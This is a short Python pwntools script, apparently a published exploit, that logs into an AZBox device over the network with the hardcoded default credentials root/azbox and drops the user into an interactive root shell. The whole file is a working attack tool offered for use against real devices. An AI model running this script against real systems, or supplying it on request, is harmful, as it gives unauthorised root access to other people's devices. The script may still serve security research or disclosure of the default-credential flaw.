#!/usr/bin/python
#
# Interactive shell for AZBox Vuln [PWNAZBox]
# By Jonatas Fil (Dkr)
#

from pwn import *

pwn = remote(args['RHOST'],args['RPORT'])

pwn.send('root\r\n') # USER
pwn.recvline()
pwn.send('azbox\r\n') # PASS
pwn.recvline()
pwn.recvline(timeout=10)
pwned = pwn.interactive() # SHELL

